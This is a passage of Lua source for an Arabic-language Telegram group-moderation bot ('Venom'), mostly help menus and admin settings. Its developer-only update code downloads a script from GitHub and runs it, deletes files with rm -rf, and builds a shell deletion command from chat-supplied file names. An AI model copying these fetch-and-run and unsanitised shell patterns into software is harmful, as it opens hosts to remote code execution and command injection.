return https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id='..msg.chat_id_..'&text=' .. URL.escape(Help or Text).."&reply_to_message_id="..Msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == "تعيين امر م1" and SecondSudo(msg) or text == "تعيين امر م١" and SecondSudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙ارسل كليشة (م1) الان " ,  1, "md")
DevAbs:set(Venom..'Abs:Help01'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local VenomTEAM =  DevAbs:get(Venom..'Abs:Help01'..msg.sender_user_id_)
if VenomTEAM == 'msg' then 
Dev_Abs(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevAbs:del(Venom..'Abs:Help01'..msg.sender_user_id_)
DevAbs:set(Venom..'Abs:Help1', text)
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
if text == "م1" or text == "م١" or text == "اوامر1" or text == "اوامر١" then
if not Admin(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙هذا الامر يخص الرتب الاعلى فقط\n𖠧︙ارسل ↫ (م6) لعرض اوامر الاعضاء', 1, 'md')
else
local Help = DevAbs:get(Venom..'Abs:Help1')
local Text = [[
𖠧︙اوامر حماية المجموعه ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙قفل • فتح ↫ الروابط
𖠧︙قفل • فتح ↫ المعرفات
𖠧︙قفل • فتح ↫ البوتات
𖠧︙قفل • فتح ↫ المتحركه
𖠧︙قفل • فتح ↫ الملصقات
𖠧︙قفل • فتح ↫ الملفات
𖠧︙قفل • فتح ↫ الصور
𖠧︙قفل • فتح ↫ الفيديو
𖠧︙قفل • فتح ↫ الاونلاين
𖠧︙قفل • فتح ↫ الدردشه
𖠧︙قفل • فتح ↫ التوجيه
𖠧︙قفل • فتح ↫ الاغاني
𖠧︙قفل • فتح ↫ الصوت
𖠧︙قفل • فتح ↫ الجهات
𖠧︙قفل • فتح ↫ الماركداون
𖠧︙قفل • فتح ↫ التكرار
𖠧︙قفل • فتح ↫ الهاشتاك
𖠧︙قفل • فتح ↫ التعديل
𖠧︙قفل • فتح ↫ التثبيت
𖠧︙قفل • فتح ↫ الاشعارات
𖠧︙قفل • فتح ↫ الكلايش
𖠧︙قفل • فتح ↫ الدخول
𖠧︙قفل • فتح ↫ الشبكات
𖠧︙قفل • فتح ↫ المواقع
𖠧︙قفل • فتح ↫ الفشار
𖠧︙قفل • فتح ↫ الكفر
𖠧︙قفل • فتح ↫ الطائفيه
𖠧︙قفل • فتح ↫ الكل
𖠧︙قفل • فتح ↫ العربيه
𖠧︙قفل • فتح ↫ الانكليزيه
𖠧︙قفل • فتح ↫ الفارسيه
𖠧︙قفل • فتح ↫ التفليش
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙اوامر حمايه اخرى ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙قفل • فتح + الامر ↫ ⤈
𖠧︙التكرار بالطرد
𖠧︙التكرار بالكتم
𖠧︙التكرار بالتقيد
𖠧︙الفارسيه بالطرد
𖠧︙البوتات بالطرد
𖠧︙البوتات بالتقيد
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙[Source Channel](https://t.me/venom_source)
]]
Dev_Abs(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
end end
if text == "تعيين امر م2" and SecondSudo(msg) or text == "تعيين امر م٢" and SecondSudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙ارسل كليشة (م2) الان " ,  1, "md")
DevAbs:set(Venom..'Abs:Help21'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local VenomTEAM =  DevAbs:get(Venom..'Abs:Help21'..msg.sender_user_id_)
if VenomTEAM == 'msg' then
Dev_Abs(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevAbs:del(Venom..'Abs:Help21'..msg.sender_user_id_)
DevAbs:set(Venom..'Abs:Help2', text)
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
if text == "م2" or text == "م٢" or text == "اوامر2" or text == "اوامر٢" then
if not Admin(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙هذا الامر يخص الرتب الاعلى فقط\n𖠧︙ارسل ↫ (م6) لعرض اوامر الاعضاء', 1, 'md')
else
local Help = DevAbs:get(Venom..'Abs:Help2')
local Text = [[
𖠧︙اوامر الادمنيه ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙الاعدادت
𖠧︙تاك للكل 
𖠧︙انشاء رابط
𖠧︙ضع وصف
𖠧︙ضع رابط
𖠧︙ضع صوره
𖠧︙حذف الرابط
𖠧︙حذف المطايه
𖠧︙كشف البوتات
𖠧︙طرد البوتات
𖠧︙تنظيف + العدد
𖠧︙تنظيف التعديل
𖠧︙كللهم + الكلمه
𖠧︙اسم البوت + الامر
𖠧︙ضع • حذف ↫ ترحيب
𖠧︙ضع • حذف ↫ قوانين
𖠧︙اضف • حذف ↫ صلاحيه
𖠧︙الصلاحيات • حذف الصلاحيات
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙ضع سبام + العدد
𖠧︙ضع تكرار + العدد
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙رفع مميز • تنزيل مميز
𖠧︙المميزين • حذف المميزين
𖠧︙كشف القيود • رفع القيود
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙حذف • مسح + بالرد
𖠧︙منع • الغاء منع
𖠧︙قائمه المنع
𖠧︙حذف قائمه المنع
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙تفعيل • تعطيل ↫ الرابط
𖠧︙تفعيل • تعطيل ↫ الالعاب
𖠧︙تفعيل • تعطيل ↫ الترحيب
𖠧︙تفعيل • تعطيل ↫ التاك للكل
𖠧︙تفعيل • تعطيل ↫ كشف الاعدادات
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙طرد المحذوفين
𖠧︙طرد ↫ بالرد • بالمعرف • بالايدي
𖠧︙كتم • الغاء كتم
𖠧︙تقيد • الغاء تقيد
𖠧︙حظر • الغاء حظر
𖠧︙المكتومين • حذف المكتومين
𖠧︙المقيدين • حذف المقيدين
𖠧︙المحظورين • حذف المحظورين
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙تقييد دقيقه + عدد الدقائق
𖠧︙تقييد ساعه + عدد الساعات
𖠧︙تقييد يوم + عدد الايام
𖠧︙الغاء تقييد ↫ لالغاء التقييد بالوقت
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙[Source Channel](https://t.me/venom_source)
]]
Dev_Abs(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
end end
if text == "تعيين امر م3" and SecondSudo(msg) or text == "تعيين امر م٣" and SecondSudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙ارسل كليشة (م3) الان " ,  1, "md")
DevAbs:set(Venom..'Abs:Help31'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local VenomTEAM =  DevAbs:get(Venom..'Abs:Help31'..msg.sender_user_id_)
if VenomTEAM == 'msg' then
Dev_Abs(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevAbs:del(Venom..'Abs:Help31'..msg.sender_user_id_)
DevAbs:set(Venom..'Abs:Help3', text)
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
if text == "م3" or text == "م٣" or text == "اوامر3" or text == "اوامر٣" then
if not Admin(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙هذا الامر يخص الرتب الاعلى فقط\n𖠧︙ارسل ↫ (م6) لعرض اوامر الاعضاء', 1, 'md')
else
local Help = DevAbs:get(Venom..'Abs:Help3')
local Text = [[
𖠧︙اوامر المدراء ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙فحص البوت
𖠧︙ضع اسم + الاسم
𖠧︙اضف • حذف ↫ رد
𖠧︙ردود المدير
𖠧︙حذف ردود المدير
𖠧︙اضف • حذف ↫ رد متعدد
𖠧︙حذف رد من متعدد
𖠧︙الردود المتعدده
𖠧︙حذف الردود المتعدده
𖠧︙حذف قوائم المنع
𖠧︙منع ↫ بالرد على ( ملصق • صوره • متحركه )
𖠧︙حذف قائمه منع + ↫ ⤈
( الصور • المتحركات • الملصقات )
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙تنزيل الكل
𖠧︙رفع ادمن • تنزيل ادمن
𖠧︙الادمنيه • حذف الادمنيه
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙تثبيت
𖠧︙الغاء التثبيت
𖠧︙اعاده التثبيت
𖠧︙الغاء تثبيت الكل
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙تغير رد + اسم الرتبه + النص ↫ ⤈
𖠧︙المطور • منشئ الاساسي
𖠧︙المنشئ • المدير • الادمن
𖠧︙المميز • المنظف • العضو
𖠧︙حذف ردود الرتب
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙تغيير الايدي ↫ لتغيير الكليشه
𖠧︙تعيين الايدي ↫ لتعيين الكليشه
𖠧︙حذف الايدي ↫ لحذف الكليشه
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙تفعيل • تعطيل + الامر ↫ ⤈
𖠧︙اطردني • الايدي بالصوره • الابراج
𖠧︙معاني الاسماء • اوامر النسب • انطق
𖠧︙الايدي • تحويل الصيغ • اوامر التحشيش
𖠧︙ردود المدير • ردود المطور • التحقق
𖠧︙ضافني • حساب العمر • الزخرفه • غنيلي
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙[Source Channel](https://t.me/venom_source)
]]
Dev_Abs(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
end end
if text == "تعيين امر م4" and SecondSudo(msg) or text == "تعيين امر م٤" and SecondSudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙ارسل كليشة (م4) الان " ,  1, "md")
DevAbs:set(Venom..'Abs:Help41'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local VenomTEAM =  DevAbs:get(Venom..'Abs:Help41'..msg.sender_user_id_)
if VenomTEAM == 'msg' then
Dev_Abs(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevAbs:del(Venom..'Abs:Help41'..msg.sender_user_id_)
DevAbs:set(Venom..'Abs:Help4', text)
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم حفظ الكليشه الجديده" ,  1, "md")
return false end
end
if text == "م٤" or text == "م4" or text == "اوامر4" or text == "اوامر٤" then
if not Admin(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙هذا الامر يخص الرتب الاعلى فقط\n𖠧︙ارسل ↫ (م6) لعرض اوامر الاعضاء', 1, 'md')
else
local Help = DevAbs:get(Venom..'Abs:Help4')
local Text = [[
𖠧︙اوامر المنشئين ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙تنزيل الكل
𖠧︙الميديا • امسح
𖠧︙تعين عدد الحذف
𖠧︙ترتيب الاوامر
𖠧︙اضف • حذف ↫ امر
𖠧︙حذف الاوامر المضافه
𖠧︙الاوامر المضافه
𖠧︙اضف نقاط ↫ بالرد • بالايدي
𖠧︙اضف رسائل ↫ بالرد • بالايدي
𖠧︙رفع منظف • تنزيل منظف
𖠧︙المنظفين • حذف المنظفين
𖠧︙رفع مدير • تنزيل مدير
𖠧︙المدراء • حذف المدراء
𖠧︙تفعيل • تعطيل + الامر ↫ ⤈
𖠧︙نزلني • امسح
𖠧︙الحظر • الكتم
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙اوامر المنشئين الاساسيين ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙وضع لقب + اللقب
𖠧︙تفعيل • تعطيل ↫ الرفع
𖠧︙رفع منشئ • تنزيل منشئ
𖠧︙المنشئين • حذف المنشئين
𖠧︙رفع • تنزيل ↫ مشرف
𖠧︙رفع بكل الصلاحيات
𖠧︙حذف القوائم
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙اوامر المالكين ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙رفع • تنزيل ↫ منشئ اساسي
𖠧︙حذف المنشئين الاساسيين 
𖠧︙المنشئين الاساسيين 
𖠧︙حذف جميع الرتب
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙[Source Channel](https://t.me/venom_source)
]]
Dev_Abs(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
end end
if text == "تعيين امر م5" and SecondSudo(msg) or text == "تعيين امر م٥" and SecondSudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙ارسل كليشة (م5) الان " ,  1, "md")
DevAbs:set(Venom..'Abs:Help51'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local VenomTEAM =  DevAbs:get(Venom..'Abs:Help51'..msg.sender_user_id_)
if VenomTEAM == 'msg' then
Dev_Abs(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevAbs:del(Venom..'Abs:Help51'..msg.sender_user_id_)
DevAbs:set(Venom..'Abs:Help5', text)
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
if text == "م٥" or text == "م5" or text == "اوامر5" or text == "اوامر٥" then
if not SudoBot(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙هذا الامر للمطورين فقط', 1, 'md')
else
local Help = DevAbs:get(Venom..'Abs:Help5')
local Text = [[
𖠧︙اوامر المطورين ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙الكروبات
𖠧︙المطورين
𖠧︙المشتركين
𖠧︙الاحصائيات
𖠧︙المجموعات
𖠧︙اسم البوت + غادر
𖠧︙اسم البوت + تعطيل
𖠧︙كشف + -ايدي المجموعه
𖠧︙رفع مالك • تنزيل مالك
𖠧︙المالكين • حذف المالكين
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙رفع • تنزيل ↫ مدير عام
𖠧︙حذف • المدراء العامين 
𖠧︙رفع • تنزيل ↫ ادمن عام
𖠧︙حذف • الادمنيه العامين 
𖠧︙رفع • تنزيل ↫ مميز عام
𖠧︙حذف • المميزين عام 
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙اوامر المطور الاساسي ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙تحديث
𖠧︙الملفات
𖠧︙المتجر
𖠧︙السيرفر
𖠧︙روابط الكروبات
𖠧︙تحديث السورس
𖠧︙تنظيف الكروبات
𖠧︙تنظيف المشتركين
𖠧︙حذف جميع الملفات
𖠧︙تعيين الايدي العام
𖠧︙تغير المطور الاساسي
𖠧︙حذف معلومات الترحيب
𖠧︙تغير معلومات الترحيب
𖠧︙غادر + -ايدي المجموعه
𖠧︙تعيين عدد الاعضاء + العدد
𖠧︙حظر عام • الغاء العام
𖠧︙كتم عام • الغاء العام
𖠧︙قائمه العام • حذف قائمه العام
𖠧︙وضع • حذف ↫ اسم البوت
𖠧︙اضف • حذف ↫ رد عام
𖠧︙ردود المطور • حذف ردود المطور
𖠧︙تعيين • حذف • جلب ↫ رد الخاص
𖠧︙جلب نسخه الكروبات
𖠧︙رفع النسخه + بالرد على الملف
𖠧︙تعيين • حذف ↫ قناة الاشتراك
𖠧︙جلب كليشه الاشتراك
𖠧︙تغيير • حذف ↫ كليشه الاشتراك
𖠧︙رفع • تنزيل ↫ مطور
𖠧︙المطورين • حذف المطورين
𖠧︙رفع • تنزيل ↫ مطور ثانوي
𖠧︙الثانويين • حذف الثانويين
𖠧︙تعيين • حذف ↫ كليشة الايدي
𖠧︙اذاعه للكل بالتوجيه ↫ بالرد
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙تفعيل ملف + اسم الملف
𖠧︙تعطيل ملف + اسم الملف
𖠧︙تفعيل • تعطيل + الامر ↫ ⤈
𖠧︙الاذاعه • الاشتراك الاجباري
𖠧︙ترحيب البوت • المغادره
𖠧︙البوت الخدمي • التواصل
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙[Source Channel](https://t.me/venom_source)
]]
Dev_Abs(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
end end
if text == "تعيين امر م6" and SecondSudo(msg) or text == "تعيين امر م٦" and SecondSudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙ارسل كليشة (م6) الان " ,  1, "md")
DevAbs:set(Venom..'Abs:Help61'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local VenomTEAM =  DevAbs:get(Venom..'Abs:Help61'..msg.sender_user_id_)
if VenomTEAM == 'msg' then
Dev_Abs(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevAbs:del(Venom..'Abs:Help61'..msg.sender_user_id_)
DevAbs:set(Venom..'Abs:Help6', text)
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم حفظ الكليشه الجديده" ,  1, "md")
return false end
end
if text == "م٦" or text == "م6" or text == "اوامر6" or text == "اوامر٦" then
local Help = DevAbs:get(Venom..'Abs:Help6')
local Text = [[
𖠧︙اوامر الاعضاء ↫ ⤈
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙السورس • موقعي • رتبتي • معلوماتي 
𖠧︙رقمي • لقبي • نبذتي • صلاحياتي • غنيلي
𖠧︙رسائلي • حذف رسائلي • اسمي • معرفي 
𖠧︙ايدي •ايديي • جهاتي • راسلني • الالعاب 
𖠧︙نقاطي • بيع نقاطي • القوانين • زخرفه 
𖠧︙رابط الحذف • نزلني • اطردني • المطور 
𖠧︙منو ضافني • مشاهدات المنشور • الرابط 
𖠧︙ايدي المجموعه • معلومات المجموعه 
𖠧︙نسبه الحب • نسبه الكره • نسبه الغباء 
𖠧︙نسبه الرجوله • نسبه الانوثه • التفاعل
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙لقبه + بالرد
𖠧︙كول + الكلمه
𖠧︙زخرفه + اسمك
𖠧︙برج + نوع البرج
𖠧︙معنى اسم + الاسم
𖠧︙بوسه • بوسها ↫ بالرد
𖠧︙احسب + تاريخ ميلادك
𖠧︙رفع مطي • تنزيل مطي • المطايه
𖠧︙هينه • هينها ↫ بالرد • بالمعرف
𖠧︙صيحه • صيحها ↫ بالرد • بالمعرف
𖠧︙صلاحياته ↫ بالرد • بالمعرف • بالايدي
𖠧︙ايدي • كشف  ↫ بالرد • بالمعرف • بالايدي
𖠧︙تحويل + بالرد ↫ صوره • ملصق • صوت • بصمه
𖠧︙انطق + الكلام تدعم جميع اللغات مع الترجمه للعربي
┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉
𖠧︙[Source Channel](https://t.me/venom_source)
]]
Dev_Abs(msg.chat_id_, msg.id_, 1, (Help or Text), 1, 'md')
end
--     Source Venom     --
if SecondSudo(msg) then
if text == "تحديث السورس" or text == "تحديث سورس" then 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙جاري تحديث سورس ڤينوم', 1, 'md') 
os.execute('rm -rf Venom.lua') 
os.execute('wget https://raw.githubusercontent.com/VenomTEAM/Venom/master/Venom.lua') 
dofile('Venom.lua') 
io.popen("rm -rf ../.telegram-cli/*")
print("\27[31;47m\n          ( تم تحديث السورس )          \n\27[0;34;49m\n") 
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم التحديث الى الاصدار الجديد', 1, 'md') 
end
if text == 'تحديث' or text == 'تحديث البوت' or text == '↫ تحديث 𖠧' then  
dofile('Venom.lua') 
io.popen("rm -rf ../.telegram-cli/*")
print("\27[31;47m\n        ( تم تحديث ملفات البوت )        \n\27[0;34;49m\n") 
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم تحديث ملفات البوت", 1, "md")
end 
--     Source Venom     --
if text == 'الملفات' then
Files = '\n𖠧︙الملفات المفعله في البوت ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n'
i = 0
for v in io.popen('ls Files'):lines() do
if v:match(".lua$") then
i = i + 1
Files = Files..i..'~ : `'..v..'`\n'
end
end
if i == 0 then
Files = '𖠧︙لا توجد ملفات في البوت'
end
send(msg.chat_id_, msg.id_,Files)
end
if text == "متجر الملفات" or text == 'المتجر' then
local Get_Files, res = https.request("https://raw.githubusercontent.com/VenomTEAM/VenomFiles/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n𖠧︙قائمة ملفات متجر سورس ڤينوم\n𖠧︙الملفات المتوفره حاليا ↫ ⤈\n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n"
local TextE = "┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n𖠧︙علامة ↫ (✔) تعني الملف مفعل\n𖠧︙علامة ↫ (✖️) تعني الملف معطل\n"
local NumFile = 0
for name,Info in pairs(res.plugins_) do
local CheckFileisFound = io.open("Files/"..name,"r")
if CheckFileisFound then
io.close(CheckFileisFound)
CheckFile = "(✔)"
else
CheckFile = "(✖️)"
end
NumFile = NumFile + 1
TextS = TextS.."𖠧︙"..Info..' ↫ ⤈\n'..NumFile.."~ : `"..name..'` ↬ '..CheckFile.."\n"
end
send(msg.chat_id_, msg.id_,TextS..TextE) 
end
else
send(msg.chat_id_, msg.id_,"𖠧︙لا يوجد اتصال من الـapi") 
end
end
if text == "مسح جميع الملفات" or text == "حذف جميع الملفات" then
os.execute("rm -fr Files/*")
send(msg.chat_id_,msg.id_,"𖠧︙تم حذف جميع الملفات المفعله")
end
if text and text:match("^(تعطيل ملف) (.*)(.lua)$") then
local FileGet = {string.match(text, "^(تعطيل ملف) (.*)(.lua)$")}
local FileName = FileGet[2]..'.lua'
local GetJson, Res = https.request("https://raw.githubusercontent.com/VenomTEAM/VenomFiles/master/VenomFiles/"..FileName)
if Res == 200 then
os.execute("rm -fr Files/"..FileName)
send(msg.chat_id_, msg.id_,"\n𖠧︙الملف ↫ *"..FileName.."*\n𖠧︙تم تعطيله وحذفه من البوت بنجاح") 
dofile('Venom.lua')  
else
send(msg.chat_id_, msg.id_,"𖠧︙لا يوجد ملف بهذا الاسم") 
end
end
if text and text:match("^(تفعيل ملف) (.*)(.lua)$") then
local FileGet = {string.match(text, "^(تفعيل ملف) (.*)(.lua)$")}
local FileName = FileGet[2]..'.lua'
local GetJson, Res = https.request("https://raw.githubusercontent.com/VenomTEAM/VenomFiles/master/VenomFiles/"..FileName)
if Res == 200 then
local ChekAuto = io.open("Files/"..FileName,'w+')
ChekAuto:write(GetJson)
ChekAuto:close()
send(msg.chat_id_, msg.id_,"\n𖠧︙الملف ↫ *"..FileName.."*\n𖠧︙تم تفعيله في البوت بنجاح") 
dofile('Venom.lua')  
else
send(msg.chat_id_, msg.id_,"𖠧︙لا يوجد ملف بهذا الاسم") 
end
return false
end
end 
--     Source Venom     --
if text and (text == 'حذف معلومات الترحيب' or text == 'مسح معلومات الترحيب') and SecondSudo(msg) then    
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم حذف معلومات الترحيب', 1, 'md')   
DevAbs:del(Venom..'Abs:Text:BotWelcome')
DevAbs:del(Venom..'Abs:Photo:BotWelcome')
return false
end 
if text and (text == 'تفعيل ترحيب البوت' or text == 'تفعيل معلومات الترحيب') and SecondSudo(msg) then    
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم تفعيل الترحيب عند اضافة البوت في المجموعه', 1, 'md')   
DevAbs:del(Venom..'Abs:Lock:BotWelcome')
return false
end 
if text and (text == 'تعطيل ترحيب البوت' or text == 'تعطيل معلومات الترحيب') and SecondSudo(msg) then    
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم تعطيل الترحيب عند اضافة البوت في المجموعه', 1, 'md')   
DevAbs:set(Venom..'Abs:Lock:BotWelcome',true)
return false
end 
if text and (text == 'تغير معلومات الترحيب' or text == 'تغيير معلومات الترحيب' or text == '↫ تغير معلومات الترحيب 𖠧') and SecondSudo(msg) then    
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙ارسل لي نص الترحيب', 1, 'md') 
DevAbs:del(Venom..'Abs:Text:BotWelcome')
DevAbs:del(Venom..'Abs:Photo:BotWelcome')
DevAbs:set(Venom.."Abs:Set:BotWelcome"..msg.sender_user_id_,"Text") 
return false
end 
if text and DevAbs:get(Venom.."Abs:Set:BotWelcome"..msg.sender_user_id_) == 'Text' then 
if text and text:match("^الغاء$") then 
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم الغاء الامر", 1, "md") 
DevAbs:del(Venom.."Abs:Set:BotWelcome"..msg.sender_user_id_)   
return false
end 
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم حفظ النص ارسل لي صورة الترحيب\n𖠧︙ارسل ↫ الغاء لحفظ النص فقط", 1, 'md')   
DevAbs:set(Venom.."Abs:Text:BotWelcome",text) 
DevAbs:set(Venom.."Abs:Set:BotWelcome"..msg.sender_user_id_,"Photo") 
return false 
end 
if DevAbs:get(Venom.."Abs:Set:BotWelcome"..msg.sender_user_id_) == 'Photo' then 
if text and text:match("^الغاء$") then 
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم حفظ النص والغاء حفظ صورة الترحيب", 1, "md") 
DevAbs:del(Venom.."Abs:Set:BotWelcome"..msg.sender_user_id_)    
return false
end 
if msg.content_.photo_ and msg.content_.photo_.sizes_[1] then   
DevAbs:set(Venom.."Abs:Photo:BotWelcome",msg.content_.photo_.sizes_[1].photo_.persistent_id_)
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم حفظ النص وصورة الترحيب", 1, 'md')   
DevAbs:del(Venom.."Abs:Set:BotWelcome"..msg.sender_user_id_)   
end
return false
end
--     Source Venom     --
if text and text:match("^ضع كليشه المطور$") or text and text:match("^وضع كليشه المطور$") or text and text:match("^تغيير كليشه المطور$") then
if not SecondSudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙للمطور الاساسي فقط ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙ارسل كليشة المطور الان ", 1, "md")
DevAbs:setex(Venom.."Abs:DevText"..msg.chat_id_..":" .. msg.sender_user_id_, 300, true)
end end
if text and text:match("^مسح كليشه المطور$") or text and text:match("^حذف كليشه المطور$") then
if not SecondSudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙للمطور الاساسي فقط ', 1, 'md')
else
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم حذف كليشة المطور", 1, "md")
DevAbs:del(Venom.."DevText")
end end
--     Source Venom     --
if DevAbs:get(Venom.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_) then 
if text and text:match("^الغاء$") then 
Dev_Abs(msg.chat_id_, msg.id_, 1, "𖠧︙تم الغاء الامر", 1, "md") 
DevAbs:del(Venom.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
return false  end 
DevAbs:del(Venom.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_)  
local texxt = string.match(text, "(.*)") 
DevAbs:set(Venom..'Abs:ChText',texxt)
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙تم تغيير كليشة الاشتراك الاجباري', 1, 'md')
end
if text and text:match("^تغير كليشه الاشتراك$") and SecondSudo(msg) or text and text:match("^تغيير كليشه الاشتراك$") and SecondSudo(msg) then  
DevAbs:setex(Venom.."textch:user"..msg.chat_id_.."" .. msg.sender_user_id_, 300, true)  
local text = '𖠧︙حسنا ارسل كليشة الاشتراك الجديده'  
Dev_Abs(msg.chat_id_, msg.id_, 1,text, 1, 'md') 
end
if text == "حذف كليشه الاشتراك الاجباري" or text == "حذف كليشه الاشتراك" then  
if not SecondSudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙للمطور الاساسي فقط ', 1, 'md')
else
DevAbs:del(Venom..'Abs:ChText')
textt = "𖠧︙تم حذف كليشة الاشتراك الاجباري"
Dev_Abs(msg.chat_id_, msg.id_, 1,textt, 1, 'md') 
end end
if text == 'كليشه الاشتراك' or text == 'جلب كليشه الاشتراك' then
if not SecondSudo(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙للمطور الاساسي فقط ', 1, 'md')
else
local chtext = DevAbs:get(Venom.."Abs:ChText")
if chtext then
Dev_Abs(msg.chat_id_, msg.id_, 1, '𖠧︙كليشة الاشتراك ↫ ⤈ \n┉ ≈ ┉ ≈ ┉ ≈ ┉ ≈ ┉\n['..chtext..']', 1, 'md')
else
